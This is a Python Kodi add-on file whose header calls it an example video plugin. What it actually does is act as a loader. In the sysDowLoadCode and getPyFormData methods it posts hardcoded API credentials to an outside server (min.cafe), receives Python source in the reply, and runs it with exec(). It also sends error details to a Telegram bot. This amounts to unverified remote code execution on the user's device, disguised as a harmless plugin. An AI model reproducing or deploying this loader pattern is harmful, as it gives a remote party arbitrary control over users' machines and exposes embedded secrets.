# Copyright (C) 2023, Roman V. M.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""
Example video plugin that is compatible with Kodi 20.x "Nexus" and above
"""
import os
import sys
from urllib.parse import urlencode, parse_qsl

import xbmcgui
import xbmcplugin
from xbmcaddon import Addon
from xbmcvfs import translatePath
import requests
import json 
# Import PyXBMCt module.
import pyxbmct
import time


class myMessage(pyxbmct.AddonDialogWindow):
    def __init__(self,title,mess_,callBack_close=None):
        self.callBack_close = callBack_close
        # You need to call base class' constructor.
        super(myMessage, self).__init__(title)
        # Set the window width, height and the grid resolution: 4 rows, 3 columns.
        self.setGeometry(350, 200, 2, 3)  

        label = pyxbmct.Label(mess_, alignment=pyxbmct.ALIGN_CENTER)
        self.placeControl(label, 0, 0, columnspan=3)

        button_close = pyxbmct.Button('Đóng')
        self.placeControl(button_close, 1, 2) 
        self.setFocus(button_close)
        self.connect(button_close, self.btnClose)

    def btnClose(self):
        self.close()

        if self.callBack_close is not None:
            self.callBack_close()

class mainKODI():
    def __init__(self):
        pass
    
    #thời gian mở áp dùng cho qua ngầy thì cập nhập code mới tự động, giúp sửa lỗi và thêm chức năng
    TIME_START_APP = ""
    SYS_KODI_Class = None

    def start(self):  
        self.funcCallBack_checkCodeOfParent()

    def funcCallBack_checkCodeOfParent(self):
        self.SYS_KODI_Class = self.sysDowLoadCode()
        if self.SYS_KODI_Class is not None: 
            self.SYS_KODI_Class.start(self.funcCallBack_checkCodeOfParent)
        else:
            self.showMess("Lỗi","Không kết nối mạng hoặc không tìm thấy server. Vui lòng quay lại sau!")

    def showMess(self,title,mess):
        window = myMessage(title,mess)
        # Show the created window.
        window.doModal()
        # Delete the window instance when it is no longer used.
        del window 

    def sysDowLoadCode(self):
        try:
            json_data = self.getPyFormData("KODICode",{
                    "API_key": "LdeEv5uJ3tJ5zT6",
                    "API_secret": "jkWKe7tsykiiYUL-jkWKe7tsykiiYUL-jkWKe7tsykiiYUL"
                })
            if "data" in json_data and "KODICode" in json_data["data"] and json_data["data"]["KODICode"]!="":
                class_name = "KODICode"
                create_class_ = {}
                str_code = json_data["data"]["KODICode"]
                str_code = str_code.replace("__class_replace__id__", class_name)
                str_code = str_code+"\nab = lambda: "+class_name+"()" 
                exec(str_code, create_class_)
                return create_class_["ab"]()
        except Exception as inst: 
            exc_type, exc_obj, exc_tb = sys.exc_info() 
            self.getPyFormData("TelegramSendBot", {
                                "content":"""sysDowLoadCode.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
                                "telegram_user":"thanhlm22"
                            })
        return None
    
    def getPyFormData(self,key__request, data__request={}):
        try:
            # lấy data cho form auto từ GooInTech
            myobj = {"key__request": key__request,
                    "data__request": data__request}

            headers_ = {
                "Content-Type": "application/json",
                "GooPyForm": "IsGOO"
            }
            r = requests.post(url="https://min.cafe/pyform-data", data=json.dumps(
                myobj), headers=headers_)

            if r.status_code == 200:
                return r.json()
        except Exception as inst: 
            exc_type, exc_obj, exc_tb = sys.exc_info() 
            self.getPyFormData("TelegramSendBot", {
                                "content":"""getPyFormData.1 Lỗi tại::"""+str(exc_tb.tb_lineno)+""", loại:"""+str(exc_type)+"""Lỗi:"""+str(inst), 
                                "telegram_user":"thanhlm22"
                            })
            
        return None


if __name__ == '__main__':  
    mK = mainKODI()
    mK.start()
    
